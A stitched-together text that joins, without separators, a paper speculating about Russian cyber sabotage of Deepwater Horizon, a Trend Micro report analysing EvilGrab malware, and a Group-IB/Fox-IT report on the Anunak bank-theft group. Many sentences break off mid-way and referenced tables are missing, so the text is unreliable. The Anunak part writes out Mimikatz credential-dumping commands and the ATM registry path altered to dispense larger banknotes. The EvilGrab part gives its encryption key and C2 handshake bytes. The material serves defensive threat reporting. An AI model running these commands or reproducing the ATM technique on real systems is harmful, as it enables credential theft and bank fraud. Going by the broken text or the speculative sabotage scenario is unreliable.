This demonstrative proficiency , combined with the previously noted 2009 Mario Azar incident would suggest that the technical capability to set this in motion was readily available .
After identifying several targets in the GoM , Russian operators could easily have exploited a multitude of attack vectors .
Employee 's personal systems ( which could have VPN access to onshore control stations or the rig directly ) , mobile devices like smart - phones , portable storage devices such as usb drives , engineer laptops , or an onshore control center with access to the rigs could have been leveraged to gain access .
Such attacks could be trivially done even with open - source or free tools such as the iconic Metasploit Framework .
Metasploit 's custom payload , Meterpreter , for example is capable of residing purely in volatile memory , often leaving few residual traces on persistent storage , if any .
After identifying an entry point such as social engineering ( perhaps too high profile ) or more likely exploitation , Russian operatives could find a series of servers at the onshore control center with a long up - time or that were not regularly updated ( and therefore not regularly restarted ) .
The attackers could have leveraged these to create redundant avenues of access which run entirely in volatile memory , thus leaving minimal to no permanent traces .
More likely and stable however would be the use of such exploitation to install a persistent backdoor .
From here they could have stolen credentials or otherwise escalated privileges to gain access to the safety systems on the Deepwater Horizon and other rigs operating in the area .
It is likely that the same attack vector would not have been used in every instance to obscure any pattern analysis and diversify opportunities for success .
At this point setting off alarms in the early hours to encourage employees to disable them , impairing other safety systems and causing general instability would have been enough to subtly magnify the effects beyond a manageable level resulting in catastrophe .
After having discussed in some detail the possibility of a state actor 's involvement , it must equally be considered that there is also plenty of evidence suggesting that this was nothing more than a tragic incident .
It may also be stated that there is evidence contrary to the posed scenario .
The Deepwater horizon incident and the 2008 Caspian Sea incident before it were merely two incidents in an industry fraught with others .
Additionally , two incidents - regardless of similarity - are not conclusive enough to represent a pattern .
Should they be a part of a larger pattern , it is far more likely that these particular incidents pointed to a pattern of corporate neglect than anything else .
The inherently dangerous nature of oil refinery work would imply that accidents and loss of life are an unfortunate reality of the industry .
According to the Centers for Disease Control and Prevention , `` The fatality rate for oil and gas workers in the U.S. between 2002 and 2007 was more than 29 deaths per 100,000 workers , or about seven times the average for all occupations .
Deepwater Horizon , though perhaps their worst to date , was not their first prolific disaster .
They were also required to pay 50.6 million dollars in fines for failing to fix the safety violations that were brought to them by OSHA before the explosion .
These same corporate failings were present in the Deepwater Horizon incident and were brought up during the senate hearings .
This in part serves to highlight the fact that even if the incident were to be a state - sponsored attack , the impact of the loss of a single rig or small well is relatively inconsequential to the overall oil production of the victim .
The timeline of the Deepwater Horizon incident also speaks volumes – the incident took place over the course of at least a year and was the product of many budget - saving decisions that were acknowledged to be dangerous by the engineers who were working on the Macondo well drilling effort .
These measures and a culture of risk are likely what ultimately sealed the fate of the Deepwater Horizon .
These occurrences are too intricate whilst spread over such an extended period of time for any one entity to have reasonably controlled them all .
It is within human nature to look for a pattern or design for an event even when there is n't any – this can be augmented by time as more possible `` clues '' become apparent .
For this reason such attribution which seeks out a conclusion is a slippery slope and must be approached with caution - it has a tendency to entice analysts to find facts to fit the hypothesis as opposed to a hypothesis which fits the facts .
It 's important to remember that correlation does not equal causation ; in fact correlation may be coincidental or the result of another unanticipated factor .
Likewise the circumstantial evidence alone is not conclusive .
Between 1969 and 2005 there have been over 30 separate incidents on oil rigs ranging from fires and explosions , to structural failures , some of which were blowouts not unlike the one that occurred on Deepwater Horizon .
It is likely that circumstantial information about one or more of these could be strung together to provide a reasonably convincing political ' attribution .
The observation of a moderately sized cross - section of cyber events within the oil and gas industry clearly indicates that there is ongoing cyber conflict .
This conflict exists in the form of espionage and sabotage , and it involves both state and non - state actors .
In the case of cyber espionage , these actors are advanced in the sense that they have launched multi - year campaigns which have gone undetected as they have exflitrated what is likely untold billions of dollars in intellectual property .
There tactics represent a formalization and ritualization of the conflict which will suggests that it has been weaponized and will continue to escalate in the future .
The Chinese government is absolutely involved in some capacity , and stands to gain the most out if these transactions .
China will need to continue to make aggressive moves to sustain its need for oil going forward as its ability to meet growing demand becomes overwhelmed .
Red October , while largely targeted at diplomatic entities , also targeted the oil and gas industry .
The sophistication of the infrastructure used in Red October , as well as the methods , suggest a revolution in the type of cyber conflict that will be seen in the oil and gas industry .
A majority of these groups are still active as of April 2013 , even after being outed in reports released by antivirus and incident response companies over the last few years .
These reports themselves represent one aspect in which non - state actors will become ever more important in cyber conflict , particularly within important industries such as oil and gas .
American companies are particularly vulnerable targets to state - backed or state - owned foreign competitors who may in the future leverage their countries ' cyber forces to gain competitive advantage , or possible develop their own .
This type of competitiveness may lead to the types of sabotage exchanges seen in the Middle East .
These attacks may either have been the work of nation - states battling out policy in the cyber realm , or unconnected events with the Shamoon attacks merely being a disaffected hacktivist group expressing dissent .
Regardless of origin , these exchanges are clear examples of cyber conflict of a destructive nature .
Going forward , the sophistication of the viruses used in these attacks will likely only increase .
Attacks like the flame and Stuxnet viruses may be seen by American companies within the industry .
The line between espionage and sabotage attacks can be somewhat blurred with viruses being modular and having the capability to perform both ; gathering intel while waiting undetected to unleash a more sinister capability .
The very use of these types of malware breeds and intimacy and familiarity with them that allows for their further proliferation by the parties who were previously attacked .
Even if they can not reverse engineer them , they may understand the behaviors well enough to crudely mimic them .
As discussed at the beginning of the paper , cyber conflict is attractive .
It is attractive to criminal elements , corporate elements , individuals , hacktivists , state actors , and other sundry non - state actors alike .
Because of its low barrier to entry , availability , and outsized impact , the oil industry must prepare for sustained future conflict in this realm .
Advanced Persistent Threat : An advanced persistent threat ( APT ) uses multiple phases to break into a network , avoid detection , and harvest valuable information over the long term .
These phases are Incursion , Discovery , Capture , and Exfiltration according to Symantec .
Anonymous : A decentralized group of individuals who label themselves as `` hactivists .
The group frequently picks their targets based on current events or decisions of companies that conflict with an ever changing mantra of the group .
The attacks perpetrated by Anonymous are frequently not complex in nature and often are designed just to restrict access to public websites through a denial of service attack .
C2 : Command and Control Cyber Warfare : `` Actions by a nation - state to penetrate another nation 's computers or networks for the purposes of causing damage or disruption . `` Dropper virus : A type of Trojan that serves to transport and extract a viral payload onto the destination system .
The dropper is frequently made to masquerade as an innocuous executable that once executed the viral payload has been deployed .
The dropper service at this point no longer needs to be running .
Exfiltration : The opposite of infiltrate .
The act of secretly stealing information from the enemy 's control .
It is a form of espionage .
Malware : A generic term used to describe software designed to cause malicious actions on a computer system .
Trojans , Viruses , and Worms are examples of types of Malware .
Reflexive control : `` A means of conveying to a partner or an opponent specially prepared information to incline him to voluntarily make the predetermined decision desired by the initiator of the action .
Spear phishing : The process of attempting , often through email , to acquire someone else 's user information .
This is achieved through social engineering and often involves sending emails that appear to be from a known and trusted individual .
Trojan : A type of computer malware that does not replicate , rather its primary function is to allow unauthorized access to the computer systems , steal information , or cause harm to the infected system .
A Trojan often presents itself as an innocuous file thus tricking the user into executing .
Virus : A type of computer malware that is able to self - replicate and infect multiple systems .
The replication is usually tied to a human interaction .
Highly targeted attacks refer to a category of threats that pertain to intrusions by threat actors or attackers .
These attackers aggressively pursue and compromise chosen targets in order to steal sensitive information .
These are not conducted through separate attacks ; rather , they comprise of a series of attempts over time to get deeper and deeper into a target 's network .
Each attempt may either succeed or fail , but the overall goal is to penetrate the target 's network and acquire information .
Malware is typically used as an attack vector , but the real threat involves human operators who adapt , adjust , and improve their methods based on the victim 's defenses .
Enterprises should consider targeted attacks a high - priority threat because of the considerable damage they incur .
The human and systemic weaknesses that allow an attacker to compromise an organization can be minimized and mitigated with correct practices and solutions .
However , these same weaknesses can never be fully resolved .
Trend Micro monitors the targeted attack landscape in order to identify ongoing campaigns and provide additional threat intelligence useful for identifying the existence of these campaigns in an enterprise network .
This quarterly report presents the targeted attack campaigns observed and mitigated by Trend Micro based on reported customer cases , as well as our own independently gathered data .
Targeted Attack Campaigns Profiling We encountered a variety of targeted campaigns in the second quarter of the year .
These include the following : • IXESHE .
The IXESHE campaign is known for targeting East Asian governments , electronics manufacturers , and telecommunications firms .
We released a white paper discussing this campaign .
This recently discovered campaign also targets government agencies in the Asia Pacific region .
It is called ELISE after certain strings found in its unpacked code .
This family of backdoors ( aka HTTP Tunnel ) is Chinese in origin and was used in attacks against Asian government organizations .
This is a targeted campaign believed to be associated with the Comment Crew attacker group because of the use of encrypted / obfuscated HTML comments to hide their C & C transactions .
This campaign made use of a malware family identified as NetTraveler based on the strings found in the malware code .
The malware is detected as BKDR_TRAVLAR .
Our data indicates that the majority of targeted attack victims are various government agencies .
Targeted firms from the technology sector include telecommunication firms , Internet service providers , and software companies .
The financial services sector and the aerospace industry were also targeted this quarter .
The targeted attacks that we analyzed were heavily concentrated in Asia , particularly Taiwan and Japan .
Based on our findings , the most common type of email attachment type used in targeted attacks were file archives of various forms .
When uncompressed , these archives typically contain the malicious payload itself , which the user may then run directly .
Alternately , they may also contain a .DOC
Frequently , the .EXE
In addition , we also saw an increased use of files that make use of right - to - left override ( RTLO ) in Unicode .
We were also able to monitor the activity of various C & C servers related to targeted attacks .
By volume of C & C server activity , the following countries ranked as follows : In this report , we will provide a detailed analysis of the EvilGrab campaign .
This campaign was first found targeting certain Asian and European governments .
Its name is derived from its behavior of grabbing audio , video , and screenshots from affected machines .
Currently , the malware used by EvilGrab belongs to one of three malware families : • BKDR_HGDER • BKDR_EVILOGE • BKDR_NVICM Our research indicates that EvilGrab activity is most prevalent in China and Japan , although it is also present in other parts of the world .
Government organizations were , by far , the most affected by EvilGrab .
This geolocation is based on the IP addresses of the victims .
Therefore , foreign institutions within China would be identified as coming from China ; the same would hold true for all countries .
Research indicates that EvilGrab is primarily distributed through spear - phishing emails with malicious attachments that exploit various vulnerabilities to run malicious code .
Among the attachment types are : A .RAR
By using this name , the intention was to disguise itself as the Windows thumbnail cache .
A shortcut file ( .LNK
In reality , running the .LNK
In addition , the .RAR
The EvilGrab campaign 's use of exploits , payloads , and decoy documents is similar to the Taidoor campaign in 2012 .
The primary difference is that EvilGrab variants have multiple layers of shellcode .
In addition , some variants copy the file name and use it as the decoy document file name .
Other variants overwrite the exploit document with the contents of the decoy document .
As noted above , some variants also use disguised folders and shortcuts and do not use exploits to run their code .
The EvilGrab campaign makes use of this vulnerability for its AutoRun routine .
Whenever it is run , the Windows shell ( explorer.exe ) loads a component of the fax server in Windows , fxsst.dll .
This is normally located in the System32 folder .
Whenever an instance of explorer.exe is launched ( i.e. , at every system startup ) , the system searches for the said .DLL
The malicious .DLL
It also serves as the loader of the main backdoor .
While DLL preloading has been used by other malware in the past , it is less common to see it specifically target explorer.exe .
Other malware families that use this vulnerability typically target executable files outside of Windows ; EvilGrab targets a part of Windows itself .
In addition to the above behavior , EvilGrab also creates the following registry entry to enable its automatic execution at every system startup : The file % Application Data % \360\Live360.exe is a copy of one of the malware components .
It also creates a shortcut under the Startup folder in the Start menu : The above file is also a copy of one of the malicious components .
The .EXE
One of the .DLL
Some variants of EvilGrab delete the .EXE
As noted earlier , the loader file is named fxsst.dll .
However , examination of its header states that its actual file name is supposed to be svchost.dll .
These components are also encrypted and saved in the registry .
To add stealth to its backdoor routines , it uses a legitimate process context 's memory space to inject the main backdoor .
By default , this backdoor injects itself into the svchost.exe or winlogon.exe process .
It also checks if certain processes related to certain security products are running on the affected system .
The specific processes targeted are : Other variants of this malware also check if other security products are present .
It is not clear why EvilGrab specifically targets these products .
However , it is possible that the attackers determined that targets for this campaign are likely running these products .
It uses the Sample Grabber filter ( part of the DirectShow technology in Windows ) to directly perform grabbing .
It also uses Wave APIs to capture audio .
The values are then decrypted using the system library pstorec.dll .
It also steals login credential from IE autocomplete entries .
It does this by first parsing the index.dat files in the IE History folder .
It then collects autocomplete entries from the following registry key : It then initiates a brute force attack on encrypted credentials using the CryptUnprotectData API .
However , it will only try to steal passwords from IE 's password - protected sites and MSN Explorer Signup if kav.exe ( related to a security product ) is not running in the system .
If the active window is Tencent QQ ( specifically , QQ2009 through QQ2012 ) , EvilGrab will attempt to steal information by directly reading the process 's memory and checking if the class name of the focused window is not named `` EDIT .
It is then sent back to the backdoor 's C & C server .
The file on the hard drive is encrypted ; specifically , the data is XORed with the key 0x66 .
The logged keystrokes are then sent back to the C & C and saved to % User Profile % \users.bin .
The file on the hard drive is encrypted ; specifically , the data is XORed with the key 0x66 .
Each backdoor has one to three C & C servers in its code .
Some of C & C servers that we have seen from our accumulated data are as follows : To start its connection to its C & C server , the backdoor component will first send 5-bytes ( \x01\x00\x00\x00\x33 ) .
The C & C will reply if it accepts the connection .
The backdoor then replies with a beacon message , the contents of which are as follows : Either backdoor identifier 1 or backdoor identifier 2 acts as the campaign code or marker for EvilGrab campaigns , which is recognizable by the C & C server and/or attacker .
Some of the identifiers we saw in backdoor identifier 1 are : Some of the identifiers seen in our accumulated data in backdoor identifier 2 are as follows : We noted a correlation between the MZ / PE headers of variants and the strings in backdoor identifier 2 .
Variants with a V2010-v24 identifier have a proper MZ / PE header ; variants with a V2010-v16 header have portions of their header overwritten with JPEG strings .
These variants require a loader component to load them into memory in order to be executed .
Below is a sample packet sent at the beginning of the connection : EvilGrab variants possess a wide variety of possible backdoor commands .
The table below lists its possible commands : This captured packet shows sample backdoor commands and replies : These capabilities can be used for both lateral movement within a compromised organization and to steal information .
Credentials stolen this way can be used to move within the confines of the organization 's network .
It can grab audio and video files directly from devices attached on the system ( i.e .
In addition , EvilGrab can upload files from the affected system to remote servers .
Targeted attacks pose a challenge to traditional signature - based security solutions .
To deal with these type of threats , employ solutions that include network monitoring to detect and analyze incoming threats , as well as any outgoing communication with attacking parties .
Products like Trend Micro™ Deep Discovery™ are capable of mitigating the risks from these threats .
One component of Deep Discovery , the Deep Discovery Inspector , provides network threat detection , custom sandboxing , and real - time analysis and reporting .
The second component , Deep Discovery Advisor , provides sandbox analysis of known and unknown threats that augments the capabilities of existing products like endpoint solution and email / web gateways .
It also provides visibility to network - wide security events .
The capabilities provided by solutions like Deep Discovery are necessary to provide a unified , comprehensive view of the threats an organization faces .
This information can then be used by an organization to create appropriate and proportional responses to properly protect an organization 's network .
Hereby Group - IB and Fox - IT inform that : 1 .
This report was prepared to provide infor- mation obtained as a result of Group - IB and Fox - IT research .
Description of threat technical details in this Report is given only to bring the appropriate information to the attention of information se- curity specialists .
It helps to prevent informa- tion security incidents and to minimize risks by creating awareness on the trend described in this report .
The threat technical details published in this report in any case are not for the promotion of fraud and/or other illegal activities in the financial industry , high tech industry and/or other areas .
The information published in this report may be used by interested parties at their discretion provided they make reference to Group - IB and Fox - IT .
This report describes the details and type of op- erations carried out by an organized criminal group that focuses on financial industry , such as banks and payment providers , retail industry and news , media and PR companies .
The group has its origin in more common financial fraud including theft from con- sumer and corporate bank accounts in Europe and Russia , using standard banking malware , mainly Carberp .
After the arrests of Carberp group members in Russia , some of the members were out of work , however , their experience gained from many years of crime has allowed them to enter a new niche .
One of the members quickly realized that they can steal $ 2000 a thousand times , and earn $ 2 million , but also they can steal it in one time and immediately get it with much less effort .
The anti - fraud measures employed by banks has pushed the criminals to search for new ways to make money with less bar- riers , compromising and modifying or taking data from banks , payment providers , retail and media/ PR companies are some of these methods .
From 2013 an organized criminal group intensi- fied its activity focused on banks and electronic pay- ment systems in Russia and in the post - Soviet space .
The key is that fraud occurs within the corporate network using internal payment gateways and in- ternal banking systems .
Thus money is stolen from the banks and payment systems , and not from their customers .
While this is their main and most lucra- tive activity , the gang has also ventured into other areas including the compromise of media groups and other organizations for industrial espionage and likely a trading advantage on the stock market .
In cases where the group got access to the government agency networks their aim was espionage related .
The organized criminal group backbone are citizens of both Russian and Ukrainian origin , but the group also sources a number of mainstream and specialized services from individuals and groups originating from Russia , Ukraine and Belarus .
The average sum of theft in the Russian terri- tory and in the post - Soviet space is $ 2 million per incident .
Since 2013 they have successfully gained access to networks of more than 50 Russian banks and 5 payment systems , and 2 of these institutions were deprived of their banking license .
To date the total amount of theft is over 1 billion rubles ( about 25 million dollars ) , most of it has been stolen in the second half of 2014 .
The average time from the moment of penetration into the financial institutions internal network till successful theft is 42 days .
As a result of access to internal bank networks the attackers also managed to gain access to ATM management infrastructure and infect those sys- tems with their own malicious software that further allows theft from the banks ATM systems on the attackers command .
Since 2014 the organized criminal group mem- bers began actively taking an interest in US and Eu- ropean based retail organizations .
While they were already familiar with POS malware and compromis- ing POS terminals , the widespread media attention around the Target breach and other related breaches were the reason for this move .
While the scale of breaches in this industry is still relatively low , with at least 3 successful card breaches and over a dozen retailers compromised this activity is quickly becom- ing a lucrative endeavor for this group .
To penetrate into the internal networks this organized criminal group employs targeted emailing ( spear phishing ) and infections sources from other botnets .
This is the main reason why the group is keeping in touch with owners of large botnets .
Since August 2014 the group began to create their own large botnet using a mass emailing , but not using typical exploit driveby infections .
This last move is likely to reduce the need for external contacts .
The first successful bank robbery was committed by this group in January 2013 .
In all first cases the attackers used the program RDPdoor for remote access to the bank network and the program `` MBR Eraser '' to remove traces and to crack Windows computers and servers .
Both programs were used by the members of the Carberp criminal group under the guidance of a person named Germes .
To reduce the risk of losing access to the internal bank network the attackers , in addition to malicious programs , were also used for remote access legitimate pro- grams such as Ammy Admin and Team Viewer .
Lat- er the attackers completely abandoned from usage of RDPdoor and Team Viewer .
In addition to banking and payment systems , hackers got access to e - mail servers to control all internal communications .
This approach allowed them to find out that the anomalous activity in the bank network was identified , what technique was used to identify this activity and what measures the bank employees took to solve the problem .
Email control was successfully installed regardless of used email system , MS Exchange or Lotus .
This approach allowed them to take countermeasures that created for bank and payment system employees the feeling that the problem had been solved .
The main steps of the attack progression are the following ones : 1 .
Primary infection of an ordinary employee computer .
Getting a password of a user with administra- tive rights on some computers .
For example , a password of a technical support engineer .
Gaining legitimate access to one server .
Compromising the domain administrator password from the server .
Gaining access to the domain controller and compromising of all active domain accounts .
Gaining access to e - mail and workflow servers .
Gaining access to server and banking system administrator workstations .
Installing the software to monitor activity of interesting system operators .
Usually photo and video recording was used .
Configuring remote access to servers of inter- est including firewall configuration changes .
To carry out target attacks in 2014 the hackers have finalized development of their core malware Anunak that is used along with the following tools : According to our laboratory classification the main malware is `` Anunak '' .
This trojan is used for target attacks only , mainly on banks and payment systems .
Target usage of this program allows it to remain poorly explored , providing it a good surviv- ability inside corporate networks .
The source code of the bank trojan program Carberp was used in some places of this malware .
This is an open source software that al- lows to obtain passwords of user accounts logged in the Windows system .
However , this software was considerably changed : while maintaining the capability to get account passwords the functions of user interaction and of information output for errors and program execution were eliminated .
Thus , when the malicious program is executed on the server , it will secretly compromise all the domain and local accounts , including adminis- trator accounts .
To get account passwords it is sufficient to enter two commands in succession : `` privilege : : debug '' and `` sekurlsa : : logonpass- words '' .
When this program is executed on a domain controller or an e - mail server it compro- mises virtually all the domain accounts , includ- ing administrators .
There is the ability to download arbitrary exe- cutable files from the management server and run them .
One of these files is the program `` AmmyAd- min '' that may be run with the arguments `` -service '' and `` -nogui '' that force it to start as a service without user interface .
As a result , the attacker gets remote access to the user computer with the running program `` AmmyAdmin '' bypassing firewalls .
The window screenshot is shown in the figure below : When the attackers gain access to servers running operating systems of the Linux family they use SSH backdoor that transmits to the malicious server the login / password data used to access the servers and provides attackers remote access to the servers .
To provide access to the server of interest the at- tackers may appropriately modify rules for firewalls Microsoft TMG , CISCO , etc .
When the attackers yet had no major malware that would secretly install the program `` AmmyAd- min '' and report to the attackers a remote access password , they used a malicious program known as `` Barus '' .
This malware is used rarely and the last time we met it in 2013 .
This malicious program is developed by Russian - speaking authors .
In the control panel you can notice a field `` Ammy ID '' , its usage allowed the attackers to connect remotely .
At the very beginning of their activity in 2013 due to lack of the target Trojan the attackers began to distribute Andromeda and Pony .
They distributed these malware using Driveby through a bunch of Neutrino Exploit Kit exploits as shown in the figure below .
It is interesting that in the autumn 2013 they used the site http : //php.net/ as traffic source to Magnitude EK .
They redirected the traffic from this resource since July 2013 , but this fact was discov- ered much later .
The name of one of the streams to distribute the malware is `` LOL BANK FUCKIUNG '' that corresponded to the attacker activities .
Parallel to this technique they also use another infection method , which was one of the principal methods .
The main method of distribution is send- ing emails with malicious attachments on behalf of the Central Bank of the Russian Federation , a poten- tial client or an real counterparty ( at first the attack- ers had cracked this counterparty account , then they used emailing with the cracked contact list ) .
Another used method is to install a special malware to carry out targeted attacks via another malware that might appear in the local network by accident .
To find such malicious programs the criminal group keeps in touch with several owners of large botnets that massively distributes their mal- ware .
The attackers buy from these botnet owners the information about IP - addresses of computers where the botnet owners have installed malware and then check whether the IP - address belongs to the financial and government institutions .
If the mal- ware is in the subnet of interest , the attackers pay the large botnet owner for installation of their target malware .
Such partner relations were established with owners of botnets Zeus , Shiz Ranbyus .
All of these trojans are bank Trojans , their usage is ex- plained by the previously established relationships .
In late 2013 the hacker under the alias Dinhold be- gan to build his own botnet using modified Carberp , having uploaded its source code for public access .
The attackers were trying to create similar relations with this hacker , but in 2014 he was arrested , having not developed his botnet up to the required level .
To check whether the IP - address belongs to the desired network the following script is used : The most dangerous emailings are those that are sent on behalf of partners with whom financial and government institutions communicates permanently by email .
An example of such emailing occurred on Septem- ber 25 , 2014 , at 14:11 , from the e - mail address `` Elina Shchekina < e.shekina @ rbkmoney.com > '' with the subject `` Updated agree- ment version '' .
The attachment '' agreement.doc '' exploits the vul- nerability CVE-2012 - 2539 and CVE-2012 - 0158 .
The emailing was conducted for more than 70 addresses of various compa- nies ( where multiple recipient addresses may be within one company ) .
The letter with malicious attachment ( md5 : AA36BA9F- 4DE5892F1DD427B7B2100B06 ) in the archive with a password from a potential client was sent to a bank manager after a pre- liminary telephone conversation with him .
The call origin is Saint Petersburg .
Contents of a text file named '' реквизиты.doc '' ( partner de- tais.doc ) '' Company Our Century '' , Ltd. 109387 , Russia , Moscow , Anosov str . , 24 , office 409 Tel .
There were also other exam- ples of emails with malicious attachments , such as emailing with the file `` 001 . photo.exe '' .
A more detailed list of such attachments you can see in the Table `` Email attachments '' .
Availability of access to bank internal networks opens great opportunities for the hackers .
One of these opportunities is access to ATMs from spe- cial network segments that had to be isolated .
It is confirmed that this criminal group gained access to 52 ATMs .
The amount of damage exceeds 50 million rubles .
As a result of access to ATMs , depending on the ATM model , hackers used different patterns .
Having access , the attackers downloaded mali- cious scripts and changed denominations of issued banknotes in the ATM operating system registry .
As a result , for query to get 10 notes with denomination of 100 roubles the attackers received 10 banknotes with denomination of 5,000 roubles .
The used malicious script and program were developed for the platform Wincor .
The malicious script contains the following commands : Contents of the file `` 1.bat '' Execution of this file changed registry keys in the registry branch `` '' HKEY_LOCAL_MACHINE\ SOFTWARE\Wincor Nixdorf\ProTopas\Current- Version\LYNXPAR\CASH_DISPENSER '' '' that are responsible for cassette denominations in an ATM .
As a result of this file execution the registry key that is in charge of the cassette number 1 ( VALUE_1 ) is takes the value `` 100 '' , and the registry key respon- sible for the cassette number 4 ( VALUE_4 ) is set to '' 5000 '' .
Then the command to restart the computer is issued .
The registry key reference values : If the ATM actual load corresponds to the refer- ence one and registry keys have been changed , then the banknotes from the cassette No.1 will be issued with denomination `` 5000 '' instead of `` 100 '' .
In addition , the attackers used a modified debug program that allows by the command to issue mon- ey from the dispenser .
The original debug program issues money through the dispenser only when the open ATM housing and the vault door are fixed .
In order to ensure money issuance from the closed ATM the attackers had to modify the original program `` KDIAG32 '' ( the original file : size of 1,128,960 MD5 4CC1A6E049942EB- DA395244C74179EFF ) .
A comparison of the original version of the pro- gram with the modified version showed that the only difference is in ignoring error `` '' Door not opened or missing ! '' '' .
The figure below shows an error message that will be never displayed to the user in the file under investigation .
All traces found during investigation of one incident showed that the same criminal group had worked .
Ammy Admin was used for remote access , the same SSHD backdoor was installed on Unix servers and , In addi- tion , it was loaded from the same hacked server as in other cases of trojan Anunak usage .
However , in this case Androm- eda is used as the main trojan instead of Anunak .
The man- agement servers were located in Kazakhstan , Germany and Ukraine .
Check of the manage- ment servers showed that it was the hosting Bulletproof that , in addition to servers , provides a service of traffic proxying through its infrastructure as well as TOR and VPN usage , so this pattern is significantly differs from the Anunak host- ing patern .
Check of money cashout showed that the same cashout criminal group had worked as for Anunak and this fact again confirmed their cooperation .
Obtained Andromeda trojan copies were being distributed from August 2014 by e - mail .
The value 754037e7be8f61cbb1b85ab46c7da77d , which is the MD5 hash of the string `` go fuck yourself '' , was used as the RC4 encryption key .
As a result of this distri- bution from August to late October the Andromeda botnet rose up to 260,000 bots .
Successful infection in one subnet resulted in sending such letters to other bank employees .
Example of forwarding from an infected bank network to employees of another bank is shown below .
As a result of this radial mailing many oil and gas companies , banks and government agencies were in- fected .
In Russia at least 15 banks and two payment systems were infected this way .
Letters with similar attachments were being dis- tributed with the following subjects : `` My new photo '' `` Alert Transactions Report by users from 2014- 09 - 28 to 2014 - 09 - 28 '' Previously , it should be noted the fact that the process of stolen money withdrawal ( cashout ) was differed , firstly by the theft method , secondly by the victim type ( a bank or a payment system ) , thirdly by the total stolen sum .
The victims by their type were divided rather by counterparty types and by limitations imposed by operation with the counterparties .
For example , all payments were required to go through a certain pool of mediators .
In addition , the `` improper '' pool of counterparties could cause suspicion and unneces- sary testing ( manual processing of payment orders ) .
Bank ( amounts up to 100 million roubles ) : • When the attackers had obtained control of a bank operator workstation ( attacker purpose ) , they in general used a classic tree scheme when funds from the bank account were sent to several legal entities , then from each legal entity to smaller legal entities ( may be several such iter- ations ) and then to private person credit cards ( from 600 to 7000 transactions ) .
In this case the whole cashout process consisted in that a drop person had to be near the ATM at the specified time with a bag to empty the dispenser .
Bank ( amounts from 100 million roubles ) : • Money was sent to accounts of other banks , and cracked banks were often used where accounts and credit cards had been prepared in advance .
Payment system : • In addition to all the above methods , cash sending channels were also employed through the settlements systems , electronic wallets and payment systems , such as web money , Yandex Money , QIWI ( 1500 - 2000 transactions ) .
Reve- nues of large amounts ( up to 50 million roubles ) were recorded to particular cards of private per- sons who then used these cards to buy expensive small - sized goods such as jewelry , watches , and other attributes .
A huge part of the money was sent through mobile operators ( 1500 - 2000 SIM cards prepared in advance ) .
In general , this increase was due to number of thefts too ( number of victims + average stolen sum per 1 victim ) .
The groups are working in different cities to ensure better cashout distribution .
Also these groups include immigrants from former Soviet republics who if necessary arrive in the required city .
Each group was monitored by a separate person .
Each group consists of about 15 - 20 people .
While the attacks in Russia against banks and payment systems have occurred over the past two years , the attacks against the retail industry is only something which started in the second quarter of 2014 .
With at least three confirmed breaches where card track data was obtainedand a total of at least 16 breaches at retail organizations , it is also becoming a serious threat .
Apart from retail organizations it is also known that a number of media and PR companies have been breached in 2014 .
While it is not entirely cer- tain , the type of breaches suggest that the attackers are looking for inside information , a type of indus- trial espionage , allowing them to gain an advantage on the stock market .
As there is nothing specifically missing and the resulting fraud is hard to match with anything , these incidents typically are never linked .
From the retail perspective , the first infections in 2014 were sourced from a botnet which employs a widely deployed crypto - currency mining malware based on the Gozi / ISFB ( banking ) malware family .
Based on our insights we believe during the first half of 2014 over half a million systems had been compromised by this malware from over the whole world , however Russia and a number of post - Soviet states were clean of infections .
To find interesting infections within this large set of compromised systems , the malware extracts relevant information from the systems including Microsoft Windows organization registration information and network/ Windows domain information .
The Gozi / ISFB based malware was used to drop additional components on interesting systems , which included Metasploit / Meterpreter payloads and Anunak variants .
This was one of the main methods for the group using Anunak to obtain in- teresting infections in the middle of 2014 , sourcing infections from other botnet operators . More recent- ly other infection methods , including spear phishing using English language and possibly also usage of the teams own Andromeda , but also SQL injection to breach an organization directly from the outside , has been employed by this team .
The first known attacks with Anunak targeted a specific brand of POS systems which revolved around the Epicor / NSB brand .
To do this Anunak has specific code to target POS devices equipped with this software , which in contrary to the more common memory scanning track data scrapers , logs a wealth of information from the payments done by the cards .
The first case this was seen active was in July 2014 , but it might have been earlier as well .
More recent breaches have used a new custom developed POS malware , which is a more simple but reliable track data memory scraper .
The initial version from the early fall of 2014 used a simple blacklist , scraped every process and dumped track data in plain text .
More recent versions scanned only configuration specified processes and used RC4 to encrypt the extracted track data records on disk .
While the retail industry is one of its main targets due to its payment processing capabilities , other compromises might occur indirectly , for example to obtain databases with information or other informa- tion that is of value to the organized criminal group .
One of the possibilities is obtaining lists of corporate email addresses to have a higher chance of interest- ing infections .
At this moment we have no evidence of successful compromise or theft of banks and payment systems outside of Russia , but several infections in the east of Europe ( specifically Ukraine and Latvia ) were active in 2014 .
These specific infections were related to infrastructure of organizations based in Russia or with significant interests in Russia , thus more likely related to the breaches at the same organization in Russia .
The majority of infections from Europe were from dedicated servers used as exit node for VPN services , the systems infected were likely from Eastern Euro- pean or Russian origin , and possibly test infections from the attackers .
We have no evidence of compro- mises against banks in Western Europe or United States , but it should be noted that the attackers methods could be utilized against banks outside of Russia as well .
The group uses Metasploit as one of their main hacking tools , either stand alone or as part of a framework .
The activity includes port scanning and system reconnaissance , escalating privileges on systems by using for example the recent CVE-2014- 4113 vulnerability , gathering credentials and hop- ping on to other systems and networks .
Metasploit is being used to its full potential with scanning , exploiting , privilege escalation and post exploitation persistence being achieved with its standard toolset .
On interesting and critical systems typical hack- ing tools might be found to establish tunnels out of the network , either tools that are part of the Metasploit framework such as Meterpreter , but also other tools to achieve persistence on those systems .
The connect back methods seen are typically SSL over port 443 , but also DNS based methods were observed .
The attackers use BITS to download files , but also make use of Windows built - in PowerShell to download tools and execute commands .
Finally on the critical systems freshly crypted and non - detected versions of Anunak are deployed , typically these are used in very limited deployments thus their spread is limited and detection by Anti - Virus is very rare .
Various stealth methods including the aforemen- tioned backconnect SSL and DNS tunneling for compromise persistence and data exfiltration are used .
The Anunak malware has multiple ways of connecting to backends , which includes a PHP based backend reachable over HTTP and HTTPS , and a Windows server based component using a propri- etary protocol .
The use of VNC scanning and password brute forcing , the adding of additional administrator accounts , use of RDP Wrapper to allow concurrent RDP sessions are all methods to gain access and achieve persistent access to compromised systems employed by this group .
Additionally various ways of creating incidental and regular screen captures of the desktop of persons of interest within com- promised organizations were methods employed by these attackers .
This also includes video captures made by the Anunak malware , allowing attackers to observe the behavior of users of certain applications .
Group - IB is one of the leading international companies specializing in preventing and investigat- ing high - tech cyber crimes and fraud .
The company offers a range of services on preventing financial and reputational damages , consulting and auditing of information security systems , and on computer forensics .
